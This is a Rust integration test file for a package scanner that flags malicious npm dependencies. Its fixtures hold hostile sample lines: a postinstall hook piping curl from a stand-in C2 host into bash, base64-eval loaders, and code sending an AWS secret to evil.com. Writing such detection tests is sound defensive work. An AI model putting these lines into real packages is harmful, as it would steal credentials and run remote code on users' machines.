/// End-to-end integration tests.
/// All tests run without network access — fixture directories stand in for
/// installed packages.
use gard_core::{Config, Ecosystem, Manifest, TierResult, Verdict};
use gard_pkg::{manifest_diff, scorer, tier3_analyzer};
use tempfile::TempDir;

// ── Fixture helpers ───────────────────────────────────────────────────────────

fn loaded_manifest(json: &str) -> Manifest {
    serde_json::from_str(json).expect("invalid fixture manifest JSON")
}

/// Build a temp dir that looks like `node_modules/<name>/`.
fn npm_pkg_dir(root: &TempDir, name: &str) -> std::path::PathBuf {
    let p = root.path().join("node_modules").join(name);
    std::fs::create_dir_all(&p).unwrap();
    p
}

// ── T3 analysis: malicious fixtures ──────────────────────────────────────────

#[test]
fn e2e_malicious_postinstall_blocks() {
    let dir   = TempDir::new().unwrap();
    let pkg   = npm_pkg_dir(&dir, "colo0rs");
    std::fs::write(pkg.join("package.json"), r#"{
        "name": "colo0rs",
        "scripts": { "postinstall": "curl http://c2.evil.com/steal.sh | bash" }
    }"#).unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(result.is_blocking(), "postinstall with curl|bash must block");
}

#[test]
fn e2e_eval_base64_in_source_warns() {
    // Single critical pattern → Warn (need ≥2 criticals for Block)
    let dir = TempDir::new().unwrap();
    let pkg = npm_pkg_dir(&dir, "obfuscated-pkg");
    std::fs::write(pkg.join("package.json"), r#"{"name":"obfuscated-pkg"}"#).unwrap();
    std::fs::write(pkg.join("index.js"),
        "eval(Buffer.from(payload,'base64').toString())\n").unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(result.is_flagged(), "eval+base64 must at minimum warn");
    assert!(!matches!(result, TierResult::Pass), "eval+base64 must not pass");
}

#[test]
fn e2e_two_critical_patterns_block() {
    // Two critical patterns in source → Block
    let dir = TempDir::new().unwrap();
    let pkg = npm_pkg_dir(&dir, "double-evil");
    std::fs::write(pkg.join("package.json"), r#"{"name":"double-evil"}"#).unwrap();
    std::fs::write(pkg.join("index.js"), concat!(
        "eval(Buffer.from(payload,'base64').toString())\n",
        "require('child_process').exec('curl http://c2.evil.com | sh')\n",
    )).unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(result.is_blocking(), "two critical patterns must block");
}

#[test]
fn e2e_env_fetch_combo_warns() {
    // env+fetch combo produces 1 Critical finding → Warn (need ≥2 for Block)
    let dir = TempDir::new().unwrap();
    let pkg = npm_pkg_dir(&dir, "exfil-pkg");
    std::fs::write(pkg.join("package.json"), r#"{"name":"exfil-pkg"}"#).unwrap();
    std::fs::write(pkg.join("index.js"),
        "const k=process.env.AWS_SECRET;\nfetch('https://evil.com/'+k);\n").unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(result.is_flagged(), "env→fetch combo must at minimum warn");
}

#[test]
fn e2e_env_fetch_plus_extra_critical_blocks() {
    // env+fetch combo (1 Critical) + eval+base64 (1 Critical) = 2 Criticals → Block
    let dir = TempDir::new().unwrap();
    let pkg = npm_pkg_dir(&dir, "exfil-obfus");
    std::fs::write(pkg.join("package.json"), r#"{"name":"exfil-obfus"}"#).unwrap();
    std::fs::write(pkg.join("index.js"), concat!(
        "const k = process.env.AWS_SECRET;\n",
        "fetch('https://evil.com/' + k);\n",
        "eval(Buffer.from(payload,'base64').toString())\n",
    )).unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(result.is_blocking(), "env+fetch+eval must block");
}

#[test]
fn e2e_clean_package_passes() {
    let dir = TempDir::new().unwrap();
    let pkg = npm_pkg_dir(&dir, "clean-utils");
    std::fs::write(pkg.join("package.json"), r#"{"name":"clean-utils"}"#).unwrap();
    std::fs::write(pkg.join("index.js"),
        "module.exports = { add: (a, b) => a + b };\n").unwrap();

    let result = tier3_analyzer::analyze(&pkg, &Ecosystem::Npm, &Config::default());
    assert!(!result.is_blocking(), "clean utility must not block");
    assert_eq!(result, TierResult::Pass);
}

// ── Manifest diff: new-package detection ─────────────────────────────────────

#[test]
fn e2e_manifest_diff_finds_new_npm_packages() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{
        "dependencies": {
            "lodash":  "^4.17.21",
            "axios":   "~1.7.0",
            "colo0rs": "1.0.0"
        }
    }"#).unwrap();

    // Manifest already contains lodash@4.17.21
    let manifest = loaded_manifest(r#"{
        "version":"1","schema":"test","repo":null,
        "packages":[{
            "name":"lodash","version":"4.17.21","ecosystem":"npm",
            "checked_at":"2026-01-01T00:00:00Z",
            "tier1":{"result":"PASS"},
            "tier2":{"result":"PASS","score":0},
            "tier3":{"result":"SKIPPED"},
            "final":"PASS","ai_tool":null,"added_by":null
        }]
    }"#);

    let new_pkgs = manifest_diff::find_new_packages(dir.path(), &manifest).unwrap();

    assert_eq!(new_pkgs.len(), 2, "axios and colo0rs should be new");
    assert!(new_pkgs.iter().any(|p| p.name == "axios"));
    assert!(new_pkgs.iter().any(|p| p.name == "colo0rs"));
    assert!(!new_pkgs.iter().any(|p| p.name == "lodash"), "lodash already in manifest");
}

#[test]
fn e2e_manifest_diff_version_bump_is_new() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{
        "dependencies": { "express": "4.18.0" }
    }"#).unwrap();

    // Manifest has express@4.17.0 (older version)
    let manifest = loaded_manifest(r#"{
        "version":"1","schema":"test","repo":null,
        "packages":[{
            "name":"express","version":"4.17.0","ecosystem":"npm",
            "checked_at":"2026-01-01T00:00:00Z",
            "tier1":{"result":"PASS"},
            "tier2":{"result":"PASS","score":0},
            "tier3":{"result":"SKIPPED"},
            "final":"PASS","ai_tool":null,"added_by":null
        }]
    }"#);

    let new_pkgs = manifest_diff::find_new_packages(dir.path(), &manifest).unwrap();
    assert_eq!(new_pkgs.len(), 1);
    assert_eq!(new_pkgs[0].version, "4.18.0");
}

#[test]
fn e2e_manifest_diff_empty_lockfile_returns_empty() {
    let dir = TempDir::new().unwrap();
    // No lockfiles present
    let manifest = Manifest::new(None);
    let new_pkgs = manifest_diff::find_new_packages(dir.path(), &manifest).unwrap();
    assert!(new_pkgs.is_empty());
}

#[test]
fn e2e_manifest_diff_pypi_packages() {
    let dir = TempDir::new().unwrap();
    std::fs::write(dir.path().join("requirements.txt"),
        "requests==2.28.0\ndjango>=4.0\n").unwrap();

    let manifest = Manifest::new(None);
    let new_pkgs = manifest_diff::find_new_packages(dir.path(), &manifest).unwrap();
    assert_eq!(new_pkgs.len(), 2);
    assert!(new_pkgs.iter().all(|p| p.ecosystem == Ecosystem::PyPI));
}

// ── Scorer: verdict aggregation ───────────────────────────────────────────────

#[test]
fn e2e_scorer_t3_block_overrides_t2_warn() {
    let v = scorer::aggregate(
        &TierResult::Pass,
        &TierResult::Warn { reason: "score 65".into() },
        &TierResult::Block { reason: "malicious code".into() },
    );
    assert_eq!(v, Verdict::Block);
}

#[test]
fn e2e_scorer_t1_block_dominates() {
    let v = scorer::aggregate(
        &TierResult::Block { reason: "known CVE".into() },
        &TierResult::Pass,
        &TierResult::Skipped,
    );
    assert_eq!(v, Verdict::Block);
}

#[test]
fn e2e_scorer_all_pass_gives_pass() {
    let v = scorer::aggregate(
        &TierResult::Pass,
        &TierResult::Pass,
        &TierResult::Skipped,
    );
    assert_eq!(v, Verdict::Pass);
}

#[test]
fn e2e_scorer_t2_warn_gives_warn() {
    let v = scorer::aggregate(
        &TierResult::Pass,
        &TierResult::Warn { reason: "low downloads".into() },
        &TierResult::Pass,
    );
    assert_eq!(v, Verdict::Warn);
}

// ── Network integration (manual only) ────────────────────────────────────────

/// Run with: cargo test -p gard-pkg -- --ignored
#[tokio::test]
#[ignore]
async fn e2e_full_scan_lodash_passes() {
    let client = reqwest::Client::new();
    let cfg    = Config::default();
    let pkg    = gard_core::Package::new("lodash", "4.17.21", Ecosystem::Npm);

    let result = gard_pkg::scan_package(&client, &pkg, None, &cfg).await;
    assert_eq!(result.verdict, Verdict::Pass, "lodash must pass all tiers");
}

#[tokio::test]
#[ignore]
async fn e2e_full_scan_event_stream_blocks() {
    let client = reqwest::Client::new();
    let cfg    = Config::default();
    // event-stream@3.3.6 is a known supply-chain attack package
    let pkg    = gard_core::Package::new("event-stream", "3.3.6", Ecosystem::Npm);

    let result = gard_pkg::scan_package(&client, &pkg, None, &cfg).await;
    assert_eq!(result.verdict, Verdict::Block, "event-stream@3.3.6 must be blocked");
}
